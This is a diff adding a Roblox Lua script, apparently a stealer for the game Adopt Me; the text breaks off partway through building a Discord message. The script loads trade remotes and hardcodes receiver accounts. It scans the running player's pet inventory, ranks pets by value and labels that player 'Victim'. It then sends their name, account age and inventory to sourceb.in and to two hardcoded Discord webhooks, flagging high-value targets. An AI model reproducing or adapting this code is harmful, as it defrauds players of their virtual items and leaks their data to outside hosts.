@@ -1,0 +1,131 @@
+-- [[ 🛡️ MONDEUR ELYSIUM MASTER v2.0 - ADAPT ME EDITION ]] --
+-- Reconstructed from ETFB Open Source Framework
+-- Organized for: Speed, Precision, and Ease of Update
+
+-- [01] CONFIGURATION
+getgenv().WEBHOOK      = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG"
+getgenv().DUALHOOK     = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+getgenv().RECEIVERS    = {"CREOLE023", "Hisokarah", "2ndcfpaj67", "3rdcfpaj67"} 
+getgenv().THRESHOLD    = 40.0 -- Pings @everyone for hits above this value
+getgenv().HIGHTIERONLY = false -- Set to TRUE to only target high-value pets
+
+if _G.__MondeurRan then return end
+_G.__MondeurRan = true
+
+-- [02] REMOTES & MODULES
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService       = game:GetService("HttpService")
+local StarterGui        = game:GetService("StarterGui")
+local LocalPlayer       = Players.LocalPlayer
+
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys", 20))
+local RouterClient = Fsys.load("RouterClient")
+local InventoryDB  = Fsys.load("InventoryDB")
+local TradeAPI     = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
+
+local API = {
+    Add    = TradeAPI:WaitForChild("AddItemToTrade"),
+    Ready  = TradeAPI:WaitForChild("ReadyTrade"),
+    Confirm = TradeAPI:WaitForChild("ConfirmTrade"),
+    Lock   = ReplicatedStorage:WaitForChild("API"):WaitForChild("Inventory"):WaitForChild("LockItem")
+}
+
+-- [03] UTILITIES & HELPERS
+local function getActiveAdmin()
+    for _, name in pairs(getgenv().RECEIVERS) do
+        if Players:FindFirstChild(name) then return name end
+    end
+    return "None Detected"
+end
+
+local function sendWebhook(url, payload)
+    local requestFunc = (syn and syn.request) or http_request or request
+    if not requestFunc then return end
+    pcall(function()
+        requestFunc({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+-- [04] SCANNER ENGINE (PET SORTING)
+local function getSortedInventory()
+    local allData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
+    local playerKey = allData[LocalPlayer.Name] and LocalPlayer.Name or tostring(LocalPlayer.UserId)
+    local rawPets = allData[playerKey].inventory.pets
+    
+    -- ETFB Bucket System (Mega > Neon > High Tier > Normal)
+    local buckets = { mega = {}, neon = {}, high = {}, normal = {} }
+    local petCount, petText, totalPoints = 0, "", 0
+    local hasHighTier = false
+
+    for _, item in pairs(rawPets) do
+        local db = InventoryDB.pets[item.id]
+        if db then
+            local val = (_G.GetTrueValue and _G.GetTrueValue(item)) or 0
+            petCount = petCount + 1
+            totalPoints = totalPoints + val
+            petText = petText .. "- " .. (db.name or "Unknown") .. " (" .. val .. ")\n"
+
+            if val >= getgenv().THRESHOLD then hasHighTier = true end
+
+            if item.properties and item.properties.mega_neon then
+                table.insert(buckets.mega, item)
+            elseif item.properties and item.properties.neon then
+                table.insert(buckets.neon, item)
+            elseif val >= 10 then
+                table.insert(buckets.high, item)
+            else
+                table.insert(buckets.normal, item)
+            end
+        end
+    end
+
+    local finalOrder = {}
+    for _, b in pairs({buckets.mega, buckets.neon, buckets.high, buckets.normal}) do
+        for _, it in ipairs(b) do table.insert(finalOrder, it) end
+    end
+
+    return finalOrder, petCount, petText, totalPoints, hasHighTier
+end
+
+-- [05] WEBHOOK & LOGGING (PASTEFY INTEGRATED)
+local function uploadToPastefy(petText)
+    local requestFunc = (syn and syn.request) or http_request or request
+    if not requestFunc then return nil end
+    
+    local report = "=== MONDEUR ELYSIUM ADM REPORT ===\n"
+    report = report .. "Victim: " .. LocalPlayer.Name .. "\n"
+    report = report .. "Age: " .. LocalPlayer.AccountAge .. " days\n\n"
+    report = report .. "INVENTORY:\n" .. petText
+    
+    local ok, response = pcall(function()
+        return requestFunc({
+            Url = "https://sourceb.in/api/bins",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({ files = {{ content = report }} })
+        })
+    end)
+    
+    if ok and response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        return "https://cdn.sourceb.in/bins/" .. data.key .. "/0"
+    end
+    return nil
+end
+
+local function fireWebhooks(petCount, petText, totalPoints, hasHighTier)
+    local pasteLink = uploadToPastefy(petText) or "Upload Failed"
+    local admin = getActiveAdmin()
+    local ping = (totalPoints >= getgenv().THRESHOLD) and "@everyone" or ""
+
+    local embed = {
+        title = hasHighTier and "🔥 TARGET ACQUIRED (HIGH TIER)" or "💎 SYSTEM CONNECTED",
+        color = hasHighTier and 0xFF0000 or 0x00FF00,
+        fields = {
+            {name = "👤 **User Info**", value = "
